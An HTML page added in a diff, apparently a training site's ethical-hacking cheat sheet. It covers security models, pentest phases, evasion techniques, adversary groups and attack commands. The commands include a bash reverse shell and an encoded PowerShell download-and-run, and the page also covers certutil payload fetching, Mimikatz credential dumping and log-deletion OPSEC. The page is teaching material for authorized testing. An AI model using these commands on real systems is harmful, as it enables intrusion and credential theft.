@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Ethical Hacking Cheat Sheet | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- This link handles ALL responsive styles for phones, tablets, and desktops -->
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+  
+  <!-- MemberSpace -->
+  <script>
+    window.MemberSpace = window.MemberSpace || { subdomain: "iscsecurity" };
+    (function(d){
+      var s = d.createElement("script");
+      s.src = "https://cdn.memberspace.com/scripts/widgets.js";
+      s.async = true;
+      d.head.appendChild(s);
+    })(document);
+  </script>
+  
+</head>
+
+<body class="page-lesson">
+
+<div class="site-topbar" role="note" aria-label="Legal notice">
+  <small class="topbar-note">
+    © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+  </small>
+  <nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+</div>
+
+<main class="page modules-page no-shift" id="ethical-hacking-training-content" data-ms-content="members-only">
+  <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: Ethical Hacking Cheat Sheet">
+
+    <p class="breadcrumb">
+      <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking">Ethical Hacking</a> →
+      <span aria-current="page">Page 9</span>
+    </p>
+
+    <h1>Ethical Hacking Cheat Sheet</h1>
+
+    <!-- ============================================================ -->
+    <!-- AUTHORIZED USE BANNERS                                        -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-auth">
+      <strong>🚨 AUTHORIZED USE ONLY:</strong>
+      <span>
+        All content in this document is for educational and defensive training purposes only.
+        The adversarial techniques described are derived from real-world tradecraft but
+        are documented exclusively for <strong>defensive analysis, detection engineering,
+        and authorized security testing</strong>. Unauthorized deployment of any technique
+        described may constitute a criminal offense under applicable national and
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong>
+        from the system owner or authorized legal entity before testing, executing, or
+        simulating any of the techniques outlined in this document.
+      </span>
+    </div>
+
+    <div class="reminder-comp">
+      <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+      <span>
+        Cybercrime laws vary significantly by jurisdiction. It's your sole responsibility
+        to understand and comply with the laws applicable to your location, the location
+        of any target systems, and your organization's policies. When in doubt,
+        <strong>consult a qualified legal professional</strong> before testing, executing,
+        or simulating any technique described in this document.
+      </span>
+    </div>
+
+<!-- ============================================================ -->
+<!-- SECTION 1: EXECUTIVE SUMMARY                                  -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="executive-summary">
+      <h2>1. Executive Summary</h2>
+      <p>
+        This cheat sheet consolidates the essential concepts, tools, commands, and frameworks from the Ethical Hacking module. 
+        Use it as a quick reference during authorized assessments to:
+      </p>
+      <ul>
+        <li><strong>Identify</strong> core security models (CIAAN, TTPs, IATF) and hacker typologies.</li>
+        <li><strong>Execute</strong> penetration testing phases with the right tools and commands.</li>
+        <li><strong>Understand</strong> adversary behavior, kill chain mechanics, and evasion techniques.</li>
+        <li><strong>Apply</strong> advanced tradecraft including AI/ML integration and OPSEC discipline.</li>
+        <li><strong>Reference</strong> key frameworks, standards, and real-world adversary examples.</li>
+      </ul>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 2: BEGINNER LEVEL                                     -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="beginner-level">
+      <h2>2. Beginner Level — Core Foundations</h2>
+
+      <h3>Core Security Models</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Core security models">
+          <thead>
+            <tr>
+              <th>Acronym</th>
+              <th>Full Name</th>
+              <th>Meaning / Focus</th>
+              <th>Example Controls</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>CIA</td>
+              <td>Confidentiality, Integrity, Availability</td>
+              <td>Classic information security triad</td>
+              <td>Encryption, hashing, backups, redundancy</td>
+            </tr>
+            <tr>
+              <td>CIAAN</td>
+              <td>Confidentiality, Integrity, Availability, Authenticity, Non-repudiation</td>
+              <td>Extended model used in this module</td>
+              <td>PKI, digital signatures, access control, logging</td>
+            </tr>
+            <tr>
+              <td>AAA</td>
+              <td>Authentication, Authorization, Accounting</td>
+              <td>Who you are, what you can do, and what you did</td>
+              <td>MFA, RBAC, audit logs, RADIUS/TACACS+</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Tactics, Techniques &amp; Procedures (TTPs)</h3>
+      <p>
+        <strong>Tactics = why</strong> · <strong>Techniques = how</strong> · <strong>Procedures = the step-by-step</strong>
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="TTPs breakdown">
+          <thead>
+            <tr>
+              <th>Layer</th>
+              <th>Definition</th>
+              <th>Example</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Tactics</strong></td>
+              <td>High-level goal or objective of the attacker</td>
+              <td>Initial Access, Persistence, Lateral Movement, Exfiltration</td>
+            </tr>
+            <tr>
+              <td><strong>Techniques</strong></td>
+              <td>Technical ways used to achieve a tactic</td>
+              <td>Phishing, password spraying, web exploit, Kerberoasting</td>
+            </tr>
+            <tr>
+              <td><strong>Procedures</strong></td>
+              <td>Concrete step-by-step playbook used in the wild</td>
+              <td>Specific phishing kit, hosting infra, payload format, exact commands &amp; tools used in sequence</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Attack Classifications (IATF)</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Attack classifications">
+          <thead>
+            <tr>
+              <th>Class</th>
+              <th>Meaning</th>
+              <th>Common Examples</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Passive</strong></td>
+              <td>Observe only, no modification of traffic</td>
+              <td>Sniffing, OSINT, traffic analysis, metadata collection</td>
+            </tr>
+            <tr>
+              <td><strong>Active</strong></td>
+              <td>Modify, inject, or disrupt data/systems</td>
+              <td>DoS/DDoS, SQLi, XSS, MITM, exploit RCE, brute forcing</td>
+            </tr>
+            <tr>
+              <td><strong>Close-in</strong></td>
+              <td>Requires physical proximity or local presence</td>
+              <td>Shoulder surfing, rogue AP, plugging into open ports</td>
+            </tr>
+            <tr>
+              <td><strong>Insider</strong></td>
+              <td>Abuse by trusted individuals with legitimate access</td>
+              <td>Data theft by employee, planting backdoors, abuse of admin rights</td>
+            </tr>
+            <tr>
+              <td><strong>Distribution</strong></td>
+              <td>Compromise of hardware/software in the supply chain</td>
+              <td>Backdoored firmware, poisoned installers, malicious updates</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Hacker Types (Summary)</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Hacker types">
+          <thead>
+            <tr>
+              <th>Type</th>
+              <th>Intent</th>
+              <th>Typical Motivation</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>White Hat</strong></td>
+              <td>Authorized, defensive / ethical</td>
+              <td>Improve security, compliance, research</td>
+            </tr>
+            <tr>
+              <td><strong>Black Hat</strong></td>
+              <td>Unauthorized, malicious</td>
+              <td>Profit, extortion, sabotage</td>
+            </tr>
+            <tr>
+              <td><strong>Gray Hat</strong></td>
+              <td>Mixed; may break rules without clear malicious intent</td>
+              <td>Reputation, curiosity, leverage</td>
+            </tr>
+            <tr>
+              <td><strong>Hacktivist</strong></td>
+              <td>Politically / socially driven</td>
+              <td>Protest, impact, visibility for a cause</td>
+            </tr>
+            <tr>
+              <td><strong>State-Sponsored / APT</strong></td>
+              <td>Highly resourced, long-term campaigns</td>
+              <td>Espionage, strategic advantage, disruption</td>
+            </tr>
+            <tr>
+              <td><strong>Insider</strong></td>
+              <td>Abuse of legitimate access</td>
+              <td>Revenge, profit, ideology, coercion</td>
+            </tr>
+            <tr>
+              <td><strong>Script Kiddie</strong></td>
+              <td>Low skill, uses others' tools</td>
+              <td>Fun, notoriety, curiosity</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 3: INTERMEDIATE LEVEL                                 -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="intermediate-level">
+      <h2>3. Intermediate Level — Practitioner Application</h2>
+
+      <h3>Penetration Testing Phases</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Penetration testing phases">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Goal</th>
+              <th>Example Activities</th>
+              <th>Typical Tools</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Pre-Engagement</strong></td>
+              <td>Define scope, rules, and legal boundaries</td>
+              <td>RoE, NDAs, scope definition, contact matrix</td>
+              <td>Docs / templates, ticketing systems</td>
+            </tr>
+            <tr>
+              <td><strong>Information Gathering</strong></td>
+              <td>Map attack surface &amp; context</td>
+              <td>OSINT, DNS mapping, port scanning, tech stack discovery</td>
+              <td>Nmap, Masscan, theHarvester, Shodan, Censys</td>
+            </tr>
+            <tr>
+              <td><strong>Vulnerability Assessment</strong></td>
+              <td>Find potential weaknesses</td>
+              <td>Version checking, vuln scans, manual review</td>
+              <td>Nessus, OpenVAS, Qualys, Burp Suite, manual testing</td>
+            </tr>
+            <tr>
+              <td><strong>Initial Access (Exploitation)</strong></td>
+              <td>Obtain first foothold</td>
+              <td>Exploit RCE/SQLi/LFI, phishing, credential attacks</td>
+              <td>Metasploit, SQLMap, custom PoCs, Hydra</td>
+            </tr>
+            <tr>
+              <td><strong>Post-Exploitation</strong></td>
+              <td>Assess impact &amp; pivot safely</td>
+              <td>Privilege escalation, data discovery, lateral movement</td>
+              <td>BloodHound, Mimikatz, PowerView, LinPEAS/WinPEAS</td>
+            </tr>
+            <tr>
+              <td><strong>Reporting &amp; Post-Engagement</strong></td>
+              <td>Communicate risk &amp; drive remediation</td>
+              <td>Write report, debrief, retest fixes</td>
+              <td>Reporting templates, screenshots, exported logs</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Common Vulnerabilities &amp; Abbreviations</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Common vulnerabilities">
+          <thead>
+            <tr>
+              <th>Abbrev.</th>
+              <th>Full Name</th>
+              <th>Example (Initial Access Focus)</th>
+              <th>Typical Tools / Approaches</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>RCE</strong></td>
+              <td>Remote Code Execution</td>
+              <td>Sending crafted input that runs OS commands on a web server</td>
+              <td>Custom PoCs, Metasploit modules, curl, Burp Suite</td>
+            </tr>
+            <tr>
+              <td><strong>SQLi</strong></td>
+              <td>SQL Injection</td>
+              <td>Bypass login via <code>' OR 1=1--</code> in a login form</td>
+              <td>SQLMap, Burp Suite, manual UNION-based / blind testing</td>
+            </tr>
+            <tr>
+              <td><strong>XSS</strong></td>
+              <td>Cross-Site Scripting</td>
+              <td>Injecting <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> into a comment field</td>
+              <td>Burp Suite, browser dev tools, XSStrike</td>
+            </tr>
+            <tr>
+              <td><strong>LFI</strong></td>
+              <td>Local File Inclusion</td>
+              <td><code>page=index.php?file=../../../../etc/passwd</code></td>
+              <td>Burp Suite, wfuzz, custom wordlists, manual testing</td>
+            </tr>
+            <tr>
+              <td><strong>RFI</strong></td>
+              <td>Remote File Inclusion</td>
+              <td>Loading a remote PHP shell via URL parameter</td>
+              <td>Burp Suite, custom payloads, controlled web server</td>
+            </tr>
+            <tr>
+              <td><strong>CSRF</strong></td>
+              <td>Cross-Site Request Forgery</td>
+              <td>Tricking an admin into clicking a link that changes a password</td>
+              <td>Burp Suite, custom HTML forms, CSRF PoC generators</td>
+            </tr>
+            <tr>
+              <td><strong>IDOR</strong></td>
+              <td>Insecure Direct Object Reference</td>
+              <td>Changing <code>/invoice/123</code> to <code>/invoice/124</code> and viewing another user's data</td>
+              <td>Burp Suite Repeater, browser, manual parameter tampering</td>
+            </tr>
+            <tr>
+              <td><strong>SSRF</strong></td>
+              <td>Server-Side Request Forgery</td>
+              <td>Using a URL parameter to make the server call <code>http://127.0.0.1:8080</code></td>
+              <td>Burp Suite, SSRFmap, custom payloads</td>
+            </tr>
+            <tr>
+              <td><strong>XXE</strong></td>
+              <td>XML External Entity Injection</td>
+              <td>Reading <code>/etc/passwd</code> via crafted XML payload</td>
+              <td>Burp Suite, custom DTDs, attack proxies</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>OT, ICS &amp; IoT (Quick Reference)</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="OT ICS IoT reference">
+          <thead>
+            <tr>
+              <th>Acronym</th>
+              <th>Full Name</th>
+              <th>Focus</th>
+              <th>Typical Security Concern</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>OT</strong></td>
+              <td>Operational Technology</td>
+              <td>Hardware &amp; software that monitors/controls physical devices &amp; processes</td>
+              <td>Safety, uptime, legacy protocols, weak segmentation</td>
+            </tr>
+            <tr>
+              <td><strong>ICS</strong></td>
+              <td>Industrial Control Systems</td>
+              <td>Supervisory systems for industrial processes (e.g., SCADA, DCS, PLCs)</td>
+              <td>Legacy stacks, insecure-by-design protocols, critical infrastructure risk</td>
+            </tr>
+            <tr>
+              <td><strong>IoT</strong></td>
+              <td>Internet of Things</td>
+              <td>Networked embedded devices (sensors, cameras, smart home/office)</td>
+              <td>Default creds, poor updates, weak encryption &amp; authentication</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 4: ADVANCED / OPERATOR LEVEL                          -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="advanced-level">
+      <h2>4. Advanced / Operator Level — Tradecraft &amp; Evasion</h2>
+
+      <h3>Adversary Operational Security (OPSEC) Considerations</h3>
+      <ul>
+        <li><strong>C2 Discipline:</strong> Use domain fronting, CDN routing, or legitimate cloud services to mask C2 traffic.</li>
+        <li><strong>Credential Management:</strong> Never reuse credentials across operations. Use unique passwords, VPN endpoints, and operational personas.</li>
+        <li><strong>Timing Obfuscation:</strong> Schedule scanning and exploitation during legitimate business hours to blend with normal traffic.</li>
+        <li><strong>Beaconing Discipline:</strong> Use jittered beacon intervals (e.g., 5-15 minutes with random variation) rather than fixed intervals.</li>
+        <li><strong>Cleanup Procedures:</strong> Plan and execute cleanup before engagement ends — remove tools, delete logs, revert config changes.</li>
+      </ul>
+
+      <h3>Evasion Techniques</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Evasion techniques">
+          <thead>
+            <tr>
+              <th>Technique</th>
+              <th>Description</th>
+              <th>Detection Opportunity</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Living off the Land (LOLBins)</strong></td>
+              <td>Using built-in OS tools (PowerShell, WMI, certutil, bitsadmin) instead of downloading malware</td>
+              <td>Command-line logging (Sysmon EID 1), PowerShell ScriptBlock logging</td>
+            </tr>
+            <tr>
+              <td><strong>Log Tampering</strong></td>
+              <td>Clearing or selectively deleting log entries to remove evidence</td>
+              <td>Event ID 1102 (Audit Log Cleared), gaps in log sequence numbers, SIEM forwarding to immutable storage</td>
+            </tr>
+            <tr>
+              <td><strong>Process Injection</strong></td>
+              <td>Executing code within a legitimate process to evade detection</td>
+              <td>Event ID 4663 (process access), EDR behavioral detection</td>
+            </tr>
+            <tr>
+              <td><strong>DNS Tunneling</strong></td>
+              <td>Encapsulating data in DNS queries to bypass firewall restrictions</td>
+              <td>Anomalous DNS query volume, long subdomains (&gt;100 characters)</td>
+            </tr>
+            <tr>
+              <td><strong>Timestamp Stomping</strong></td>
+              <td>Altering file timestamps to evade forensic timeline analysis</td>
+              <td>File integrity monitoring (FIM), timeline anomalies via MACB analysis</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>AI &amp; Machine Learning in Ethical Hacking</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="AI ML in ethical hacking">
+          <thead>
+            <tr>
+              <th>Application Area</th>
+              <th>Goal</th>
+              <th>Example Tool</th>
+              <th>Human Validation Step</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Reconnaissance</strong></td>
+              <td>Process public information quickly</td>
+              <td>Hugging Face / NLP APIs</td>
+              <td>Verify findings through DNS, certificates, job posts</td>
+            </tr>
+            <tr>
+              <td><strong>Fuzzing</strong></td>
+              <td>Find crashes and unusual parser behavior</td>
+              <td>AFL++ / DeepFuzz</td>
+              <td>Confirm crash, root cause, exploitability</td>
+            </tr>
+            <tr>
+              <td><strong>Phishing Simulation</strong></td>
+              <td>Create realistic awareness training templates</td>
+              <td>LLM API / GoPhish</td>
+              <td>Get approval, avoid real credential collection</td>
+            </tr>
+            <tr>
+              <td><strong>Anomaly Detection</strong></td>
+              <td>Detect unusual behavior at scale</td>
+              <td>Splunk ML Toolkit</td>
+              <td>Check context, destination, user role, false positives</td>
+            </tr>
+            <tr>
+              <td><strong>Reporting</strong></td>
+              <td>Draft clearer summaries and remediation language</td>
+              <td>LLM-assisted reporting</td>
+              <td>Edit for accuracy, tone, missing context</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder">
+        <strong>AI Guardrails:</strong> Never run AI-generated code blindly. Review for hardcoded secrets, unsafe permissions, and scope compliance before execution. Validate all AI-generated findings manually before reporting.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 5: ADVERSARIAL LEVEL                                  -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="adversarial-level">
+      <h2>5. Adversarial Level — Threat Actor Perspective</h2>
+
+      <h3>Real-World Adversary Examples</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Real-world adversary examples">
+          <thead>
+            <tr>
+              <th>Adversary Group</th>
+              <th>Type</th>
+              <th>Typical Motives</th>
+              <th>Signature TTPs</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>APT29 (Cozy Bear)</strong></td>
+              <td>State-Sponsored (Russia)</td>
+              <td>Political espionage, intelligence gathering</td>
+              <td>Spear-phishing, custom malware (WellMess), OAuth abuse</td>
+            </tr>
+            <tr>
+              <td><strong>APT28 (Fancy Bear)</strong></td>
+              <td>State-Sponsored (Russia)</td>
+              <td>Political disruption, espionage</td>
+              <td>Zero-day exploitation, credential theft, X-Agent malware</td>
+            </tr>
+            <tr>
+              <td><strong>Lazarus Group</strong></td>
+              <td>State-Sponsored (North Korea)</td>
+              <td>Financial theft, cryptocurrency, espionage</td>
+              <td>Watering hole attacks, ransomware, banking trojans</td>
+            </tr>
+            <tr>
+              <td><strong>FIN7 (Carbanak)</strong></td>
+              <td>Organized Crime (Eastern Europe)</td>
+              <td>Financial fraud, payment card theft</td>
+              <td>Phishing, Carbanak backdoor, POS malware</td>
+            </tr>
+            <tr>
+              <td><strong>DarkSide</strong></td>
+              <td>Criminal Syndicate (Ransomware-as-a-Service)</td>
+              <td>Ransomware extortion, cryptocurrency</td>
+              <td>Double extortion, data leak sites, custom ransomware</td>
+            </tr>
+            <tr>
+              <td><strong>Anonymous</strong></td>
+              <td>Hacktivist Collective</td>
+              <td>Political messaging, protest, censorship resistance</td>
+              <td>DDoS, website defacement, data leaks</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Adversary Decision Cycle: The OODA Loop</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="OODA loop">
+          <thead>
+            <tr>
+              <th>Phase</th>
+              <th>Description</th>
+              <th>Adversary Action</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Observe</strong></td>
+              <td>Gather intelligence on target</td>
+              <td>OSINT, network mapping, technology fingerprinting</td>
+            </tr>
+            <tr>
+              <td><strong>Orient</strong></td>
+              <td>Analyze intelligence against known vulnerabilities</td>
+              <td>Map to CVEs, exploit databases, identify weak points</td>
+            </tr>
+            <tr>
+              <td><strong>Decide</strong></td>
+              <td>Choose the cheapest, quietest path to objective</td>
+              <td>Select tool, technique, and timing</td>
+            </tr>
+            <tr>
+              <td><strong>Act</strong></td>
+              <td>Execute with precision</td>
+              <td>Deploy exploit, establish persistence, exfiltrate data</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Adversary Philosophy</h3>
+      <ul>
+        <li><strong>Patience is Strategy:</strong> Advanced adversaries measure time in months or years.</li>
+        <li><strong>Redundancy is Survival:</strong> Maintain multiple footholds, C2 channels, and persistence mechanisms.</li>
+        <li><strong>Deniability is Protection:</strong> Use infrastructure that can be abandoned, impersonate other groups (false flags).</li>
+        <li><strong>Human Intelligence is Force Multiplier:</strong> Social engineering and insider recruitment are often more effective than zero-days.</li>
+        <li><strong>Automation is Scalability:</strong> Criminal syndicates automate ransomware deployment, credential stuffing, and reconnaissance.</li>
+      </ul>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 6: ADVERSARIAL EXAMPLES — COMMANDS AND TOOLS          -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="adversarial-examples">
+      <h2>6. Adversarial Examples — Commands and Tools</h2>
+
+      <h3>Reconnaissance &amp; Enumeration Commands</h3>
+
+      <pre><code class="language-bash"># Passive reconnaissance
+$ whois target.com
+$ dnsenum --enum target.com -o dns_results.xml
+
+# Active scanning with service fingerprinting
+$ nmap -sV -sC -O -p- -oA recon_scan target.com
+
+# Web path enumeration (rate-limited to avoid DoS)
+$ gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 20
+
+# SSL/TLS cipher enumeration
+$ nmap --script ssl-enum-ciphers -p 443 target.com
+
+# SMB enumeration and share listing
+$ enum4linux -a target.com
+$ smbclient -L \\target.com -N
+
+# LDAP enumeration for user and group discovery
+$ ldapsearch -x -H ldap://target.com -b "dc=target,dc=com" "(objectclass=person)"</code></pre>
+
+      <h3>Exploitation &amp; Initial Access (PoC Only)</h3>
+
+      <pre><code class="language-bash"># Validate CVE-2021-41773 (Apache path traversal)
+$ curl -s -o /dev/null -w "%{http_code}" http://target.com/cgi-bin/.%2e/.%2e/.%2e/etc/passwd
+# Expect 200 if vulnerable; 403 if patched
+
+# SQL injection validation with safe defaults
+$ sqlmap -u "http://target.com/page?id=1" --batch --level=2 --risk=1 --tables
+
+# Controlled Metasploit PoC
+$ msfconsole -q -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec; set RHOSTS target.com; set PAYLOAD cmd/unix/reverse_perl; set LHOST 10.10.14.5; exploit -j"
+
+# Quick reverse-shell validation (immediate termination)
+$ nc -lvnp 4444 &
+$ curl -X POST http://target.com/vuln --data 'cmd=bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1'</code></pre>
+
+      <h3>Living off the Land (LOTL) Commands</h3>
+
+      <pre><code class="language-bash"># certutil file download (signed Windows binary)
+$ certutil -urlcache -split -f http://192.168.1.100/payload.exe C:\Windows\Temp\update.exe
+
+# PowerShell memory-only execution (no disk artifact)
+$ powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
+
+# WMI lateral movement (no binary drop)
+$ wmic /node:192.168.1.51 process call create "cmd.exe /c whoami > \\192.168.1.50\share\out.txt"
+
+# netsh persistent port proxy / tunnel
+$ netsh interface portproxy add v4tov4 listenport=4444 connectaddress=192.168.1.100 connectport=443</code></pre>
+
+      <h3>Privilege Escalation &amp; Lateral Movement</h3>
+
+      <pre><code class="language-bash"># Linux privilege escalation enumeration
+$ wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+$ chmod +x linpeas.sh
+$ ./linpeas.sh -a &gt; peass_output.txt
+
+# Windows privilege escalation via PowerUp
+$ powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks | Out-File powerup.txt"
+
+# Lateral movement via PsExec
+$ psexec.exe \\target.internal -u domain\user -p password cmd.exe
+
+# Credential harvesting (authorized Red Team only)
+$ mimikatz # privilege::debug
+$ mimikatz # sekurlsa::logonpasswords</code></pre>
+
+      <h3>Tool Reference Table</h3>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Tool reference by category">
+          <thead>
+            <tr>
+              <th>Category</th>
+              <th>Example Tools</th>
+              <th>Typical Use-Case</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Recon / OSINT</strong></td>
+              <td>theHarvester, Amass, Shodan, Censys</td>
+              <td>Email &amp; subdomain discovery, exposed services, tech stack</td>
+            </tr>
+            <tr>
+              <td><strong>Scanning</strong></td>
+              <td>Nmap, Masscan</td>
+              <td>Port scanning, service discovery, version detection</td>
+            </tr>
+            <tr>
+              <td><strong>Vulnerability Scanning</strong></td>
+              <td>Nessus, OpenVAS, Qualys</td>
+              <td>Identify known vulnerabilities &amp; misconfigurations</td>
+            </tr>
+            <tr>
+              <td><strong>Web App Testing</strong></td>
+              <td>Burp Suite, OWASP ZAP, SQLMap</td>
+              <td>HTTP interception, fuzzing, SQLi/XSS/XXE testing</td>
+            </tr>
+            <tr>
+              <td><strong>Exploitation Frameworks</strong></td>
+              <td>Metasploit, exploit-db PoCs</td>
+              <td>Exploit development, payload generation, sessions</td>
+            </tr>
+            <tr>
+              <td><strong>Password Attacks</strong></td>
+              <td>Hydra, Medusa, Hashcat, John the Ripper</td>
+              <td>Online brute forcing &amp; offline hash cracking</td>
+            </tr>
+            <tr>
+              <td><strong>Post-Exploitation / AD</strong></td>
+              <td>BloodHound, PowerView, Mimikatz, Rubeus</td>
+              <td>Privilege escalation, Kerberos abuse, AD pathing</td>
+            </tr>
+            <tr>
+              <td><strong>Enumeration Scripts</strong></td>
+              <td>LinPEAS, WinPEAS, LinEnum, PowerUp</td>
+              <td>Local enumeration for privesc opportunities</td>
+            </tr>
+            <tr>
+              <td><strong>Traffic Capture &amp; Analysis</strong></td>
+              <td>Wireshark, tcpdump, Zeek</td>
+              <td>Packet capture, protocol analysis, incident review</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="info-remember">
+        <em>RedOps Reminder:</em> These commands are for authorized testing environments only. Running any of these against a system without explicit written permission is illegal and unethical. Always verify your scope and obtain proper authorization before executing any adversarial technique.
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- SECTION 7: KEY TAKEAWAYS                                      -->
+<!-- ============================================================ -->
+
+    <section class="module-section" id="key-takeaways">
+      <h2>7. Key Takeaways</h2>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Key takeaways">
+          <thead>
+            <tr>
+              <th>Concept</th>
+              <th>What You Should Remember</th>
+              <th>Operator View</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>CIAAN</strong></td>
+              <td>Confidentiality, Integrity, Availability, Authenticity, Non-repudiation define what security must protect.</td>
+              <td>Each element becomes an attacker objective.</td>
+            </tr>
+            <tr>
+              <td><strong>TTPs</strong></td>
+              <td>Tactics explain why, techniques explain how, and procedures explain the step-by-step.</td>
+              <td>Track behavior, not just tools.</td>
+            </tr>
+            <tr>
+              <td><strong>Attack Classes</strong></td>
+              <td>Passive, active, close-in, insider, and distribution attacks describe different ways systems can be targeted.</td>
+              <td>Classify the attack before choosing controls.</td>
+            </tr>
+            <tr>
+              <td><strong>Phased Methodology</strong></td>
+              <td>Adversaries move through denial, change, steal, entry, expand, and stay objectives.</td>
+              <td>Map every phase to detection and response.</td>
+            </tr>
+            <tr>
+              <td><strong>Persistence &amp; Evasion</strong></td>
+              <td>Successful attackers focus on maintaining access and avoiding detection after compromise.</td>
+              <td>Monitor scheduled tasks, startup items, SSH keys, registry changes, process behavior, and encrypted tunnels.</td>
+            </tr>
+            <tr>
+              <td><strong>AI as Force Multiplier</strong></td>
+              <td>AI can improve efficiency, automation, analysis, and reporting but cannot replace human judgment.</td>
+              <td>Use AI for suggestions, not final authority. Always validate findings manually.</td>
+            </tr>
+            <tr>
+              <td><strong>Authorization Is Essential</strong></td>
+              <td>Ethical hacking must always be conducted within approved scope and with explicit written permission.</td>
+              <td>Ensures testing remains legal, controlled, and professionally managed.</td>
+            </tr>
+            <tr>
+              <td><strong>Offensive and Defensive Security Are Connected</strong></td>
+              <td>Every attack technique can reveal opportunities for monitoring, detection, and response.</td>
+              <td>Strengthens collaboration between offensive and defensive security teams.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder">
+        <strong>🎯 Final Reminder:</strong> Use this cheat sheet to decode acronyms quickly, pick the right tool for each phase, 
+		and tie every action back to a tactic, technique, and clear business impact. Know the adversary, document every step, 
+		validate every finding, and never test without written authorization.
+      </div>
+
+      <div class="adversary-philosophy" style="background: rgba(244,67,54,0.05); border-left: 4px solid #f44336; padding: 18px 24px; margin: 24px 0; border-radius: 4px;">
